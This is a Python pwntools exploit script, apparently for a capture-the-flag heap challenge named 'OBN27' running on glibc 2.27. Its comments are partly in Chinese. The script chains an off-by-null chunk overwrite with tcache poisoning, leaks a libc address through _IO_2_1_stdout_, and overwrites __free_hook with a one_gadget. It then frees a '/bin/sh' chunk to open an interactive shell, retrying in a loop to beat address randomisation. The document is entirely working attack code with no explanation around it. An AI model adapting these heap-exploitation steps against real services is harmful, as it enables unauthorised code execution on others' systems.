#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./OBN27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,data):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('data:',data)
	
def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

while True:
	try:
		global p
		DEBUG = 1
		if DEBUG:
			p = process('./OBN27')
			libc = ELF('./libc-2.27.so')
			one_gadget = [0x4f2a5,0x4f302,0x10a2fc][1] #1.6
		else:
			p = remote('', )
			libc = ELF('./libc-2.27.so')
			one_gadget = [0x4f3d5,0x4f432,0x10a41c] #1.4

		for i in range(7):
			add(0xf8, "chunk") #0-6

		add(0xf8, "chunk7") #idx7 chunk7 950
		add(0x88, "chunk8") #idx8 chunk8 a50
		add(0x98, "chunk9") #idx9 chunk9 ae0
		add(0xf8, "chunk10") #idx10 chunk10 b80
		add(0x20, 'ccc') #idx11 chunk11 c80

		#gdb.attach(p)
		#pause()

		for i in range(7):
			delete(i)

		delete(7) # 放入 unsortedbin
		delete(9) # 放入 tcachebin

		add(0x98,'A'*0x90+p64(0x100+0x90+0xa0)) #idx12 use chunk9, off by null，修改 chunk10 的 size 位
		delete(10) #向上合并堆块,这样就控制了chunk8 78910

		#gdb.attach(p)
		#pause()

		for i in range(7):
			add(0xf0, "chunk") #13-19

		delete(8)
		add(0xf0,'idx20') #idx20 use chunk7
		add(0x20,'\x60\xc7') #idx21
		add(0x80, "idx22") #idx22 use chunk8

		#gdb.attach(p)
		#pause()
		payload = p64(0xfbad1800) + p64(0)*3 + b"\n"
		add(0x80, payload) #idx23 分配去_IO_2_1_stdout_
		data = p.recv(4)
		if 'done' in data:
			continue
		p.recvuntil("\xff"*8)
		libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3eb780
		system = libcbase + libc.sym['system']
		free_hook = libcbase + libc.sym['__free_hook']

		pr("libcbase",libcbase)
		pr('system',system)
		pr('free_hook',free_hook)

		#gdb.attach(p)
		#pause()

		delete(12)
		add(0x50,'/bin/sh\x00') #idx24

		add(0x20,p64(free_hook)) #idx25
		add(0x90,"idx26") #idx26
		add(0x90, p64(one_gadget+libcbase)) #idx27 p64(system)

		# gdb.attach(p)
		# pause()

		p.sendlineafter(':','2')
		p.sendlineafter('idx:','24')

		p.interactive()
	except:
		pass
